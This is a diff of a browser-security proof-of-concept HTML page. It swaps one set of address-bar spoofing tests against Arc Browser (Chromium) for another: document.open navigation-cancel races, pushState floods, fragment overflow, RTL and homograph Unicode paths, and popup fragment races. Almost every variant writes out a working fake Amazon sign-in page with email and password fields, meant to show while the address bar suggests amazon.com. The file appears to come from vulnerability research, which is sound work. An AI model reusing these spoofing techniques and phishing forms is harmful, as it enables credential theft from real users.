@@ -1,279 +1,260 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 5: document.open + Navigation Cancel</title>
+<title>PoC 7: Fragment Navigation + History Manipulation</title>
 <!--
-  PoC 5: document.open() + Navigation Cancellation URL Persistence
+  PoC 7: Fragment Navigation + History API Chaining
 
   Target: Arc Browser (Chromium 146+)
 
-  Technique: Based on Chromium issue 40096164. If a page calls
-  location.reload() followed by document.open(), the pending navigation
-  is cancelled but the pending URL may persist in the address bar.
+  Technique: Fragment navigations (#) are same-document navigations that
+  don't trigger full navigation commits. Combined with history.pushState
+  and history.replaceState, they may create URL states that desync from
+  actual content.
 
-  The original fix clears the NavigationEntry in the NavigationRequest
-  destructor. This PoC tests variants that might cancel navigations
-  through different code paths that don't trigger the same cleanup.
-
-  Variants:
-  A) location.reload() + document.open() (classic, likely patched)
-  B) form.submit() + document.open() (different navigation initiator)
-  C) meta refresh + document.open() (client redirect path)
-  D) anchor click + document.open() (simulated user navigation)
-  E) history.go(0) + document.open() (same-doc reload path)
+  Attack vectors tested:
+  A) Rapid pushState + fragment changes to overwhelm URL update logic
+  B) Open redirect on target domain + replaceState
+  C) Cross-window fragment navigation manipulation
+  D) data: URI in fragment (some browsers misparse)
+  E) Unicode/RTL tricks in fragment to obscure real domain
 -->
 </head>
 <body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
-<h2>PoC 5: document.open + Navigation Cancel</h2>
-<p>Tests whether cancelling a pending navigation via document.open() leaves the pending URL visible.</p>
+<h2>PoC 7: Fragment + History Manipulation</h2>
 
-<button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  A: reload() + document.open()
+<button onclick="testRapidPush()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  A: Rapid pushState Flood
 </button>
-<button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  B: form.submit() + document.open()
+<button onclick="testFragmentOverflow()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  B: Fragment Overflow
 </button>
-<button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  C: meta refresh + document.open()
+<button onclick="testUnicodeSpoof()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  C: Unicode/RTL Fragment
 </button>
-<button onclick="testVariantD()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  D: anchor click + document.open()
+<button onclick="testPopupFragment()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  D: Popup Fragment Race
 </button>
-<button onclick="testVariantE()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  E: history.go(0) + document.open()
-</button>
-<button onclick="testVariantF()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  F: window.open + document.open race
+<button onclick="testReplaceChain()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
+  E: replaceState Chain
 </button>
 
 <div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
 
-<!-- Hidden form for Variant B -->
-<form id="hiddenForm" action="https://www.amazon.com/" method="GET" style="display:none;">
-  <input type="hidden" name="ref" value="test">
-</form>
-
-<!-- Hidden anchor for Variant D -->
-<a id="hiddenLink" href="https://www.amazon.com/" style="display:none;">Amazon</a>
-
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  if (el) el.innerHTML += msg + '<br>';
+  el.innerHTML += msg + '<br>';
+  el.scrollTop = el.scrollHeight;
 }
 
-// Variant A: Classic location.reload() + document.open()
-// Chromium issue 40096164 pattern
-function testVariantA() {
-  log('[A] Starting reload + document.open variant...');
+// Variant A: Flood pushState to overwhelm URL update mechanism
+function testRapidPush() {
+  log('[A] Starting rapid pushState flood...');
 
-  // First, change the URL via pushState so we have something "interesting"
-  // to see if the pending URL persists
-  history.replaceState({}, '', '/account/login');
-  log('[A] URL changed to /account/login via replaceState');
+  const fakeURLs = [
+    '/amazon/signin',
+    '/amazon/account',
+    '/amazon/orders',
+    '/account/login',
+    '/secure/signin',
+  ];
 
-  // Initiate reload (creates a pending navigation)
-  location.reload();
+  // Rapidly push thousands of states
+  const startTime = performance.now();
+  let count = 0;
 
-  // Immediately call document.open to cancel the reload
-  // If the fix doesn't cover this path, the pending URL persists
-  document.open();
-  document.write(`
-    <html>
-    <head><title>Amazon - Sign In</title></head>
-    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
-      <h2>Sign In</h2>
-      <p>Your session expired. Please sign in again.</p>
+  for (let i = 0; i < 1000; i++) {
+    const url = fakeURLs[i % fakeURLs.length] + '#' + Math.random();
+    try {
+      history.pushState({i: i}, '', url);
+      count++;
+    } catch(e) {
+      log('[A] pushState failed at iteration ' + i + ': ' + e.message);
+      break;
+    }
+  }
+
+  const elapsed = performance.now() - startTime;
+  log('[A] Pushed ' + count + ' states in ' + elapsed.toFixed(1) + 'ms');
+  log('[A] Current URL: ' + location.href);
+
+  // Replace content with phishing UI
+  document.body.innerHTML = `
+    <div style="font-family:Arial;max-width:400px;margin:40px auto;">
+      <h2>Amazon Sign In</h2>
+      <p>URL path shows: ${location.pathname}</p>
       <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
       <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
       <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-      <p style="margin-top:12px;font-size:12px;color:#555;">
-        CHECK: What URL does the address bar show?<br>
-        If it shows the pending reload URL instead of about:blank = BUG
-      </p>
-    </body>
-    </html>
-  `);
-  document.close();
+      <p style="font-size:11px;color:#666;">Note: URL shows a path like /amazon/signin but we're on the attacker domain.</p>
+      <button onclick="location.reload()" style="margin-top:10px;padding:8px 16px;">Reset</button>
+    </div>
+  `;
+
+  log('[A] Content replaced. The URL path looks like an Amazon path.');
+  log('[A] This is same-origin path manipulation, not full URL spoofing.');
+  log('[A] Combined with a convincing domain name, this could be effective.');
 }
 
-// Variant B: Form submission creates a different type of navigation
-function testVariantB() {
-  log('[B] Starting form.submit() + document.open variant...');
+// Variant B: Very long fragment to overflow URL display
+function testFragmentOverflow() {
+  log('[B] Testing fragment overflow...');
 
-  const form = document.getElementById('hiddenForm');
+  // Some browsers truncate or hide the fragment in the address bar
+  // A very long fragment might push the real domain out of view
+  const padding = 'amazon.com/signin'.repeat(50);
+  const fragment = '#' + padding;
 
-  // Submit the form (initiates navigation to amazon.com)
-  form.submit();
+  history.replaceState({}, '', fragment);
+  log('[B] Fragment set to ' + fragment.length + ' characters');
+  log('[B] Check if the address bar only shows the fragment text,');
+  log('[B] hiding the actual domain');
 
-  // Immediately cancel with document.open
-  // Form submissions go through a different navigation path
-  setTimeout(() => {
-    document.open();
-    document.write(`
-      <html>
-      <head><title>Amazon - Sign In</title></head>
-      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
-        <h2>Account Verification Required</h2>
-        <p>Amazon requires additional verification for your account.</p>
-        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Verify</button>
-        <p style="font-size:12px;color:#555;margin-top:12px;">
-          CHECK: Does address bar show amazon.com? If yes = BUG
-        </p>
-      </body>
-      </html>
-    `);
-    document.close();
-  }, 0);
+  // Also try with path that looks legitimate
+  try {
+    history.replaceState({}, '', '/amazon.com/signin/' + 'x'.repeat(200) + '#login');
+    log('[B] Long path variant set');
+  } catch(e) {
+    log('[B] Long path failed: ' + e.message);
+  }
 }
 
-// Variant C: Meta refresh creates a client redirect navigation
-function testVariantC() {
-  log('[C] Starting meta refresh + document.open variant...');
+// Variant C: Unicode/RTL characters in URL to obscure domain
+function testUnicodeSpoof() {
+  log('[C] Testing Unicode/RTL URL manipulation...');
 
-  // Add a meta refresh that navigates to amazon
-  const meta = document.createElement('meta');
-  meta.httpEquiv = 'refresh';
-  meta.content = '0;url=https://www.amazon.com/';
-  document.head.appendChild(meta);
+  // RTL Override character (U+202E) reverses text display
+  // This could make the URL appear to show a different domain
+  const rtlOverride = '\u202E';
+  const rtlPopDirection = '\u202C';
 
-  log('[C] Meta refresh added, navigation pending...');
+  // Try various Unicode tricks
+  const tricks = [
+    // RTL override to reverse part of the URL
+    '/signin' + rtlOverride + 'moc.nozama' + rtlPopDirection,
 
-  // Cancel with document.open before the meta refresh completes
-  setTimeout(() => {
-    document.open();
-    document.write(`
-      <html>
-      <head><title>Amazon.com Shopping</title></head>
-      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
-        <h2>Welcome Back</h2>
-        <p>Please sign in to continue shopping.</p>
-        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-        <p style="font-size:12px;color:#555;margin-top:12px;">
-          CHECK: Does the address bar show amazon.com?
-        </p>
-      </body>
-      </html>
-    `);
-    document.close();
-  }, 0);
-}
+    // Zero-width characters to break domain display
+    '/signin\u200B\u200B\u200B',
 
-// Variant D: Programmatic anchor click
-function testVariantD() {
-  log('[D] Starting anchor click + document.open variant...');
+    // Combining characters
+    '/amazon\u0338.com/signin',
 
-  // Click the hidden link (simulates navigation to amazon)
-  const link = document.getElementById('hiddenLink');
+    // Homograph-like path
+    '/\u0430m\u0430zon.com/signin',  // Cyrillic 'a' in path
 
-  // Create a mouse event to simulate a real click
-  const event = new MouseEvent('click', {
-    bubbles: true,
-    cancelable: true,
-    view: window
+    // Right-to-left embedding
+    '\u202Bmoc.nozama/\u202C',
+  ];
+
+  tricks.forEach((trick, i) => {
+    try {
+      history.pushState({}, '', trick);
+      log('[C] Trick ' + (i+1) + ' applied. URL: ' + location.href);
+    } catch(e) {
+      log('[C] Trick ' + (i+1) + ' failed: ' + e.message);
+    }
   });
-  link.dispatchEvent(event);
 
-  log('[D] Link clicked, navigation to amazon.com initiated...');
+  log('[C] Check the address bar for any visual anomalies');
+  log('[C] Some characters may cause the domain to appear different');
 
-  // Race to cancel with document.open
-  setTimeout(() => {
-    document.open();
-    document.write(`
-      <html>
-      <head><title>Amazon.com</title></head>
-      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
-        <h2>Session Expired</h2>
-        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Continue</button>
-      </body>
-      </html>
-    `);
-    document.close();
-  }, 0);
+  // Show which tricks affected the URL display
+  document.body.innerHTML += `
+    <div style="background:#fff;padding:16px;border-radius:8px;margin-top:20px;">
+      <h3>URL Display Test</h3>
+      <p>Current URL: <code>${location.href}</code></p>
+      <p>If the address bar shows text that looks like amazon.com, the Unicode trick worked.</p>
+      <button onclick="location.href=location.pathname.split('#')[0]" style="padding:8px 16px;">Reset</button>
+    </div>
+  `;
 }
 
-// Variant E: history.go(0) is a same-document reload
-function testVariantE() {
-  log('[E] Starting history.go(0) + document.open variant...');
+// Variant D: Open popup, manipulate fragment from opener
+function testPopupFragment() {
+  log('[D] Testing popup + fragment manipulation...');
 
-  // Change URL to something meaningful
-  history.replaceState({}, '', '/signin');
-
-  // Same-document reload
-  history.go(0);
-
-  // Cancel immediately
-  document.open();
-  document.write(`
-    <html>
-    <head><title>Sign In</title></head>
-    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
-      <h2>Sign In Required</h2>
-      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
-      <p style="font-size:12px;color:#555;margin-top:12px;">
-        CHECK: Is the URL bar showing /signin or the original page URL?
-      </p>
-    </body>
-    </html>
-  `);
-  document.close();
-}
-
-// Variant F: window.open to target, then race document.open on the popup
-function testVariantF() {
-  log('[F] Starting window.open + document.open race variant...');
-
-  // Open popup to amazon (renderer-initiated, new tab)
-  const popup = window.open('https://www.amazon.com/');
+  // Open same-origin popup
+  const popup = window.open(location.href + '#popup');
 
   if (!popup) {
-    log('[F] Popup blocked. Allow popups for this site.');
+    log('[D] BLOCKED: Allow popups');
     return;
   }
 
-  log('[F] Popup opened to amazon.com');
+  log('[D] Popup opened. Manipulating fragment from opener...');
 
-  // In a new, unmodified tab, renderer-initiated navigations DO show
-  // the pending URL. Race to inject content via document.open before
-  // Chromium detects the access.
-  const attempts = [0, 1, 2, 5, 10, 20, 50, 100, 150, 200, 300, 500];
+  // Rapidly change the popup's fragment via the opener relationship
+  let count = 0;
+  const interval = setInterval(() => {
+    try {
+      // Change popup's hash rapidly
+      popup.location.hash = '#amazon-signin-' + count;
+      count++;
 
-  attempts.forEach(delay => {
-    setTimeout(() => {
-      try {
-        // document.open on the popup's initial empty document
-        popup.document.open();
-        popup.document.write(`
-          <html>
-          <head><title>Amazon.com</title></head>
-          <body style="font-family:Arial;padding:40px;">
-            <h1 style="color:#ff9900;">amazon</h1>
-            <h2>Sign In</h2>
-            <p>Injected at delay: ${delay}ms</p>
-            <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-            <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
-            <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-          </body>
-          </html>
-        `);
-        popup.document.close();
-        log('[F] Content injected at ' + delay + 'ms! Check popup address bar.');
-      } catch(e) {
-        // Cross-origin or access denied
-        if (delay === attempts[attempts.length - 1]) {
-          log('[F] All injection attempts failed: ' + e.message);
+      if (count > 100) {
+        clearInterval(interval);
+        log('[D] Set ' + count + ' fragments on popup');
+
+        // Now try to navigate the popup cross-origin while fragment changes
+        try {
+          popup.location.href = 'https://www.amazon.com/#' + Math.random();
+          log('[D] Navigated popup to amazon.com. Check its URL bar.');
+        } catch(e) {
+          log('[D] Cross-origin navigation error: ' + e.message);
         }
       }
-    }, delay);
-  });
+    } catch(e) {
+      clearInterval(interval);
+      log('[D] Fragment manipulation ended: ' + e.message);
+    }
+  }, 1);
+}
+
+// Variant E: replaceState chain with timing
+function testReplaceChain() {
+  log('[E] Testing replaceState chain with navigation...');
+
+  // Use replaceState to set a convincing path
+  const paths = [
+    '/account/login',
+    '/ap/signin',
+    '/gp/sign-in/sign-in.html',
+    '/auth/signin',
+  ];
+
+  let idx = 0;
+
+  // Rapidly cycle through paths
+  const interval = setInterval(() => {
+    if (idx >= paths.length * 3) {
+      clearInterval(interval);
+      log('[E] Settled on: ' + location.href);
+      return;
+    }
+
+    const path = paths[idx % paths.length];
+    history.replaceState({step: idx}, '', path);
+    idx++;
+  }, 10);
+
+  // Replace page content
+  setTimeout(() => {
+    document.body.innerHTML = `
+      <div style="font-family:Arial;max-width:400px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
+        <h2 style="color:#ff9900;">amazon</h2>
+        <h3>Sign In</h3>
+        <p style="color:#666;font-size:13px;">Current URL path: <code id="curPath"></code></p>
+        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+      </div>
+    `;
+
+    // Update shown path
+    const pathEl = document.getElementById('curPath');
+    if (pathEl) pathEl.textContent = location.pathname;
+  }, 200);
 }
 </script>
 </body>
